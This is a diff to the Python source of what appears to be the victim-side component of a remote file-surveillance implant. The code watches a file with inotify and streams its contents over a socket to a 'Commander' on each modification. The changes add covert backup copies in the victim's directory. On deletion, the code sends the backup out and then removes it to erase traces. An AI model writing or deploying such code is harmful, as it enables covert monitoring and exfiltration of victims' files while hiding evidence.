@@ -1,16 +1,13 @@
-import datetime
 import getopt
 import ipaddress
 import os
 import queue
 import socket
 import sys
-import threading
-import time
-
 import constants
 import importlib
 import inotify.adapters
+import shutil
 
 
 def parse_arguments():
@@ -118,7 +115,8 @@ def delete_file(file_path: str):
         print(f"[+] ERROR: An error occurred while deleting the file: {e}")
 
 
-def watch_stop_signal(client_socket: socket.socket, signal_queue: queue.Queue):
+def watch_stop_signal(client_socket: socket.socket,
+                      signal_queue: queue.Queue):
     while True:
         try:
             signal = client_socket.recv(100).decode()
@@ -129,10 +127,58 @@ def watch_stop_signal(client_socket: socket.socket, signal_queue: queue.Queue):
                 return None
         except socket.timeout as e:
             print("[+] ERROR: Connection to client has timed out : {}".format(e))
-            break
+            client_socket.settimeout(None)
+            return None
         except socket.error as e:
             print("[+] Socket error: {}".format(e))
-            break
+            client_socket.settimeout(None)
+            return None
+
+
+def create_backup_file(original_filename: str, backup_filename: str, modified_file_dict: dict):
+    """
+    Creates and replaces the current version of a backup file with a new one
+    in the victim's current directory.
+
+    @param original_filename:
+            A string representing the original file name
+
+    @param backup_filename:
+            A string representing the backup file name
+
+    @param modified_file_dict:
+            A dictionary containing files marked with modified status
+
+    @return: None
+    """
+    # Create an initial backup if doesn't exist
+    if not os.path.exists(backup_filename):
+        shutil.copy2(original_filename, backup_filename)
+        print(constants.BACKUP_FILE_CREATED_MSG.format(original_filename, backup_filename))
+        return None
+
+    # Check if the file is modified
+    if modified_file_dict[original_filename]:  # If modified (true)...
+        # a) Check if the destination file exists and remove it
+        if os.path.exists(backup_filename):
+            os.remove(backup_filename)
+
+        # b) Create copy
+        shutil.copy2(original_filename, backup_filename)
+        print(constants.BACKUP_FILE_CREATED_MSG.format(original_filename, backup_filename))
+
+        # c) Remove modification mark
+        modified_file_dict[original_filename] = False
+    else:
+        return None
+
+
+def remove_file(file_path: str):
+    if os.path.exists(file_path):
+        os.remove(file_path)
+        print("[+] FILE DELETION SUCCESSFUL: The following file has been deleted {}!".format(file_path))
+    else:
+        print("[+] ERROR: The following file does not exist: {}".format(file_path))
 
 
 def watch_file(client_socket: socket.socket,
@@ -143,14 +189,20 @@ def watch_file(client_socket: socket.socket,
     notifier = inotify.adapters.Inotify()
     print("[+] WATCHING FILE: Now watching the following file: {}".format(file_path))
 
-    # Add the file to watch for modification events
+    # Add the file to watch for modification and delete events
     notifier.add_watch(file_path)
+
+    # Initialize a modified file dictionary to keep track of modified files
+    modified_files_dict = {file_path: False}
+
+    # Create Initial Backup Copy of Watch File
+    backup_file_name = constants.BACKUP_MODIFIER + "_" + file_path.split("/")[-1]
+    create_backup_file(file_path, backup_file_name, modified_files_dict)
 
     try:
         while True:
             # Wait for events
             for event in notifier.event_gen():
-
                 # Check signal for stop before processing event
                 if not signal_queue.empty() and signal_queue.get() == constants.STOP_KEYWORD:
                     notifier.remove_watch(file_path)
@@ -159,12 +211,16 @@ def watch_file(client_socket: socket.socket,
                 if event is not None:
                     (header, type_names, watch_path, _) = event
 
-                    # If Modified -> Send events to Commander for modification
+                    # a) Create a backup (most present) copy for any event (in case of deletion)
+                    backup_file_name = constants.BACKUP_MODIFIER + "_" + watch_path
+                    create_backup_file(file_path, backup_file_name, modified_files_dict)
+
+                    # c) If Modified -> Send events to Commander for modification
                     if "IN_MODIFY" in type_names:
                         print(constants.WATCH_FILE_MODIFIED.format(watch_path))
                         client_socket.send("IN_MODIFY".encode())
 
-                        # Start file transfer in a separate thread
+                        # i) Start file transfer
                         with open(file_path, 'rb') as file:
                             while True:
                                 file_data = file.read(1024)
@@ -175,10 +231,34 @@ def watch_file(client_socket: socket.socket,
                         client_socket.send(constants.END_OF_FILE_SIGNAL)
                         print(constants.WATCH_FILE_TRANSFER_SUCCESS.format(file_path))
 
-                    # If Deleted -> Send events to commander that file has been deleted
+                        # ii) Mark file as modified
+                        modified_files_dict[file_path] = True
+
+                    # d) If Deleted -> Send events to notify commander that file has been deleted
                     if "IN_DELETE" in type_names or "IN_DELETE_SELF" in type_names:
                         print(constants.WATCH_FILE_DELETED.format(watch_path))
                         client_socket.send("IN_DELETE".encode())
+
+                        # i) Get backup file path
+                        backup_file_name = constants.BACKUP_MODIFIER + "_" + watch_path
+
+                        # ii) Start file transfer
+                        with open(backup_file_name, 'rb') as file:
+                            while True:
+                                file_data = file.read(1024)
+                                if not file_data:
+                                    break
+                                client_socket.send(file_data)
+
+                        client_socket.send(constants.END_OF_FILE_SIGNAL)
+                        print(constants.WATCH_FILE_TRANSFER_SUCCESS.format(file_path))
+
+                        # iii) Remove traces of backup
+                        remove_file(backup_file_name)
+
+                        # iv) Stop watching file and return to main()
+                        print("[+] WATCH FILE END: Watch file for {} has ended".format(watch_path))
+                        return None
     # Handle Ctrl+C to exit the loop
     except KeyboardInterrupt:
         pass
